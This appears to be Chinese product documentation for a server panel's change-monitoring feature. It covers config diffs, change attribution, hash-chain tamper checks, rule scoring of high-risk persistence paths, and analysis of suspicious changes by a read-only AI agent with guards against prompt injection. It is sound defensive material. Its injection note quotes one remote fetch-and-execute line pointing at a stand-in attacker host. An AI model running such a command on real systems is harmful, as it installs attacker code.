# 变更感知

绝大多数线上故障和入侵，都是由「某个东西被改了」开始的。但传统监控只看结果指标（CPU 高了、磁盘满了），看不到原因；而 AI 排查时最常见的一句话是「我不知道它上次好好的到现在发生了什么」。

变更感知补的就是这一层：**谁，在什么时候，把什么，从什么样改成了什么样**。它只记录事实，不做判断——判断交给规则复核和 Agent。

## 采集什么

六类来源，全部只读观察，靠轮询和读系统文件，不装 agent、不改系统配置：

| 来源 | 观察对象 | 粒度 |
|---|---|---|
| 配置文件 | `/etc` 下高危与常见配置（nginx、sshd、sudoers、hosts、sysctl、fstab…） | 逐行 diff |
| 软件包 | dpkg / rpm 安装、升级、卸载 | 包名 + 版本变化 |
| 服务状态 | systemd 单元的 active/failed、启停、重启 | 单元状态迁移 |
| 账号与权限 | 用户增删、组变更、sudo 授权 | 账号与组差异 |
| 防火墙规则 | iptables / nftables 规则集 | 规则行差异 |
| 定时任务 | 系统 crontab、用户 crontab、`/etc/cron.d` | 任务行差异 |

配置文件是重点也最容易做砸：它按内容哈希做基线，文件没变就不产生事件；变了才计算逐行 diff，并对内容做**脱敏**（`password=`、`api_key=`、私钥块等替换为占位符）后再落库。

## 谁改的：诚实的三级归因

归因做不到 100% 准确，所以不假装准确：

| 置信度 | 含义 | 判断依据 |
|---|---|---|
| `confirmed` 已确认 | 能确定到具体人 | 变更时刻存在唯一活跃的 SSH 会话 / 面板操作记录 |
| `inferred` 推断 | 大概是谁 | 变更前后有某账号登录，或由已知的包管理器操作产生 |
| `unknown` 未知 | 不知道 | 没有可用线索（例如 cron 触发的脚本改动） |

界面上会把 `inferred` 单独标出来，`unknown` 直接写「未知」，不会用「系统」两个字糊过去。

## 防篡改：哈希链

每条变更记录都带前一条的哈希，形成一条链。任何一条被删除或改写，后续校验就会断在那一处。

- 面板「变更」页顶部可随时校验（`变更链校验`）
- 校验结果会指出断点位置，用于判断「是数据损坏，还是有人在删记录」
- 空库或首条记录的锚点异常时会自愈，不会因为历史版本遗留状态导致永远报红

## 规则复核：0 token 的成本先判一道

每条变更进来后先过一遍**纯规则打分**（不调用大模型），输出 0–1 的分数和三到五条理由：

| 加分项 | 权重 |
|---|---|
| 高危路径（`/etc/passwd`、`authorized_keys`、`sudoers`、`ld.so.preload`、systemd、cron…） | +0.45 |
| 重要配置（nginx、mysql、redis、hosts、sysctl、fstab…） | +0.20 |
| 操作者未知 | +0.25 |
| 操作者只是推断 | +0.10 |
| 来源是公网地址 | +0.30 |
| root 通过 SSH 修改 | +0.15 |
| 非工作时段 | +0.15 |
| 周末 | +0.05 |
| 1 小时内反复修改同一对象 | +0.15 |
| 30 分钟内主机上有高危事件 | +0.35 |
| 该操作者第一次改这个对象 | +0.10 |
| **减分**：包管理器/系统目录产生的变更 | **−0.35** |
| **减分**：包管理/缓存目录 | **−0.10** |

分档：

| 分数 | 判定 | 后续 |
|---|---|---|
| ≥ 0.55 | **可疑** | 事件等级升到 high，唤醒 Agent 做深度分析 |
| 0.30 – 0.55 | 待确认 | 记录，不进 Agent |
| < 0.30 | 正常 | 只记录 |

这一步的价值：把「apt 升级产生的 300 条变更」自动压到「正常」，只把真正值得看的几条送到大模型面前。

## Agent 深度分析

判为可疑的变更会带着**原始 diff** 直接进 Agent 的调查上下文（连同操作者、来源 IP、涉及字段、增删行数）。Agent 拿到的任务不是「这个变更危险吗」，而是：

```
【判定】正常运维 / 需人工确认 / 高度可疑
【依据】不超过 5 条，每条一句话
【建议】放行 / 建议回滚某个具体对象（由人执行，你没有写权限）
```

它会被引导按优先级取证：先看 diff 本身，再核对操作者近期登录，只在必要时补查持久化位置（`authorized_keys`、cron、systemd、`ld.so.preload`），最后判断这是孤立运维操作还是攻击链的一环。

预算默认 12 步 / 240 秒 / 10 万 token，冷却 600 秒（同一条链 10 分钟内只分析一次）。**写权限为零**：变更类事件被强制降级为 shadow，写工具全部禁用。

> 注入防护：diff 正文是不可信输入。送进模型前会做边界加固——正文包在带哨兵的代码块里，围栏长度按内容自适应，正文里伪造的段落标记和结束哨兵会被中和。**内容本身不改**：`curl evil.sh | sh` 这一行必须原样呈现，它就是结论。

## 忽略规则

不是所有变更都值得记录。对已知的噪声（例如某个应用每分钟重写自己的缓存文件），可以加忽略规则：

- 支持 glob，`*` 匹配单层、`**` 匹配任意层
- 规则对**采集层**生效——命中后连事件都不会产生，不是「产生了再隐藏」
- 变更列表里可以一键从当前对象生成规则

规则管理在「变更 → 忽略规则」，每条可带备注，随时删除。

## 快照与回滚

对配置文件和账号类变更，OpsMini 在改动前会保留一份原文件快照（受配额约束）：

- 变更详情里可以直接「回滚到这次变更之前」，带二次确认
- 回滚前会再打一份当前状态快照，失败可再回滚回来
- 快照按数量和总量双重配额清理，不会把磁盘撑爆

## 并入攻击链

从 v1.4 起，**可疑变更可以作为攻击链的「持久化」环节**：

- 前提三条同时成立：规则复核判为可疑、改的是能扛过重启的位置、链上已经出现了「执行落地」或「外联控制」
- 时间窗 1 小时内（超过 1 小时的同名变更更可能是运维收尾）
- 变更永不作为攻击链的起点——单独的配置修改不构成入侵

变更列表的判定列会显示「已并入攻击链」，点一下跳到对应攻击链；攻击链的环节标签上也会注明该环节来自「变更」还是「WebShell / 可疑进程 / 网络外联」。

## 默认保留与配额

| 项 | 默认 |
|---|---|
| 变更元数据保留 | 30 天 |
| diff 正文保留 | 7 天 |
| diff 正文总量上限 | 可配置（超出按最旧淘汰） |
| 快照数量/总量 | 可配置（超出按最旧清理） |

保留策略在「面板设置」中可调。过期只删 diff 正文，元数据与哈希链保留，所以「这条记录存在过」这件事本身不会被抹掉。

## 已知限制

- **重启后的第一轮扫描会漏采**：文件源以启动时的扫描作为基线，进程重启期间发生的文件改动不会被记为「变更」（因为没有上一版可比）。这不是 bug，是哈希基线扫描的固有行为。要观察某个文件，等面板稳定运行 20 秒以上再做改动。
- **只覆盖文本配置**：二进制文件、超大的日志类文件不采集 diff。
- **归因依赖登录日志**：如果主机上清空了 `wtmp`/`lastlog`，归因会退化为「未知」——而这本身就是一个值得注意的信号。
